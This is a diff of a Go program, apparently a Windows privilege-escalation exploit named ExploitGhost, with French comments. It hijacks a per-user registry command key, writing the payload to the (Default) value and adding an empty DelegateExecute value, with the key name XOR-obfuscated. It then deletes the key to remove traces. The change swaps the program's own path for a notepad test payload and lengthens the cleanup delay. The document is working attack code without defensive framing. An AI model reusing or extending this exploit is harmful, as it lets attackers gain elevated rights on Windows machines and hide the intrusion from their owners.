@@ -4,7 +4,6 @@ package main
 
 import (
 	"fmt"
-	"os"
 	"os/exec"
 	"syscall"
 	"time"
@@ -97,8 +96,9 @@ func ExploitGhost() bool {
 	defer procNtClose.Call(uintptr(hKey))
 
 	// Injection du Payload dans (Default)
-	selfPath, _ := os.Executable()
-	data, _ := syscall.UTF16FromString(selfPath)
+	// selfPath, _ := os.Executable()
+	payload := "cmd.exe /c start notepad.exe" // Test avec le bloc-notes
+	data, _ := syscall.UTF16FromString(payload)
 	procNtSetValue.Call(uintptr(hKey), uintptr(0), 0, uintptr(1), uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)*2))
 
 	// Injection de DelegateExecute (Valeur vide - INDISPENSABLE sur Windows 11)
@@ -120,7 +120,7 @@ func ExploitGhost() bool {
 	}
 
 	fmt.Println("[*] Phase 4 : Nettoyage...")
-	time.Sleep(3 * time.Second)
+	time.Sleep(10 * time.Second)
 	exec.Command("reg", "delete", "HKCU\\"+xor(k1), "/f").Run()
 
 	return true
